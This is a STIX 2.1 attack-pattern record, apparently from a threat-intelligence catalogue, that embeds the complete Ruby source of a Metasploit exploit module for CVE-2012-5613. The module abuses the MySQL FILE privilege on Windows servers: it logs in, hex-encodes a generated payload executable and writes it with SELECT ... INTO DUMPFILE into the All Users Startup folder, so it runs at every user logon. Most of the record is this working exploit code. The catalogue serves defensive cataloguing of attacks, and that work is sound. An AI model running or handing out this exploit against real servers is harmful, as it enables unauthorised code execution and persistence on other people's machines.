{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e0318575-dc1a-4fdc-b5fb-5648508988bc",
    "created": "2024-08-14T16:56:40.691942Z",
    "modified": "2024-08-14T16:56:40.691945Z",
    "name": "Oracle MySQL for Microsoft Windows FILE Privilege Abuse",
    "description": " This module takes advantage of a file privilege misconfiguration problem specifically against Windows MySQL servers. This module abuses the FILE privilege to write a payload to Microsoft's All Users Start Up directory which will execute every time a user logs in. The default All Users Start Up directory used by the module is present on Windows 7. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/mysql/mysql_start_up.rb",
            "external_id": "mysql_start_up.rb"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2012/Dec/13"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::MYSQL\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle MySQL for Microsoft Windows FILE Privilege Abuse',\n      'Description'    => %q{\n        This module takes advantage of a file privilege misconfiguration problem\n        specifically against Windows MySQL servers. This module abuses the FILE\n        privilege to write a payload to Microsoft's All Users Start Up directory\n        which will execute every time a user logs in. The default All Users Start\n        Up directory used by the module is present on Windows 7.\n      },\n      'Author'         =>\n        [\n          'sinn3r',\n          'Sean Verity <veritysr1980[at]gmail.com>'\n        ],\n      'DefaultOptions' =>\n        {\n          'DisablePayloadHandler' => true\n        },\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2012-5613'], #DISPUTED\n          ['OSVDB', '88118'],\n          ['EDB', '23083'],\n          ['URL', 'https://seclists.org/fulldisclosure/2012/Dec/13']\n        ],\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'MySQL on Windows', { } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2012-12-01'\n    ))\n\n    register_options(\n      [\n        OptString.new('USERNAME', [ true, 'The username to authenticate as']),\n        OptString.new('PASSWORD', [ true, 'The password to authenticate with']),\n        OptString.new('STARTUP_FOLDER', [ true, 'The All Users Start Up folder', '/programdata/microsoft/windows/start menu/programs/startup/'])\n      ])\n  end\n\n  def check\n    m = mysql_login(datastore['USERNAME'], datastore['PASSWORD'])\n    return Exploit::CheckCode::Safe unless m\n\n    return Exploit::CheckCode::Appears if is_windows?\n\n    Exploit::CheckCode::Safe\n  end\n\n  def query(q)\n    rows = []\n\n    begin\n      res = mysql_query(q)\n      return rows unless res\n      res.each_hash do |row|\n        rows << row\n      end\n    rescue ::Mysql::ParseError\n      return rows\n    end\n\n    rows\n  end\n\n  def is_windows?\n    r = query(\"SELECT @@version_compile_os;\")\n    r[0]['@@version_compile_os'] =~ /^Win/ ? true : false\n  end\n\n  def get_drive_letter\n    r = query(\"SELECT @@tmpdir;\")\n    drive = r[0]['@@tmpdir'].scan(/^(\\w):/).flatten[0] || ''\n\n    drive\n  end\n\n  def upload_file(bin, dest)\n    p = bin.unpack(\"H*\")[0]\n    query(\"SELECT 0x#{p} into DUMPFILE '#{dest}'\")\n  end\n\n  def exploit\n    unless datastore['STARTUP_FOLDER'].start_with?('/') && datastore['STARTUP_FOLDER'].end_with?('/')\n      fail_with(Failure::BadConfig, \"STARTUP_FOLDER should start and end with '/' Ex: /programdata/microsoft/windows/start menu/programs/startup/\")\n    end\n\n    print_status(\"Attempting to login as '#{datastore['USERNAME']}:#{datastore['PASSWORD']}'\")\n    begin\n      m = mysql_login(datastore['USERNAME'], datastore['PASSWORD'])\n    rescue ::Mysql::AccessDeniedError\n      fail_with(Failure::NoAccess, \"#{peer} - Access denied\")\n    end\n\n    fail_with(Failure::NoAccess, \"#{peer} - Unable to Login\") unless m\n\n    unless is_windows?\n      fail_with(Failure::NoTarget, \"#{peer} - Remote host isn't Windows\")\n    end\n\n    begin\n      drive = get_drive_letter\n    rescue ::Mysql::ParseError\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Could not determine drive name\")\n    end\n\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Could not determine drive name\") unless drive\n\n    exe_name = Rex::Text::rand_text_alpha(5) + \".exe\"\n    dest     = \"#{drive}:#{datastore['STARTUP_FOLDER']}#{exe_name}\"\n    exe      = generate_payload_exe\n\n    print_status(\"Uploading to '#{dest}'\")\n    begin\n      upload_file(exe, dest)\n    rescue ::Mysql::AccessDeniedError\n      fail_with(Failure::NotVulnerable, \"#{peer} - No permission to write. I blame kc :-)\")\n    end\n    register_file_for_cleanup(\"#{dest}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-12-01",
    "x_mitre_platforms": [
        "win'"
    ]
}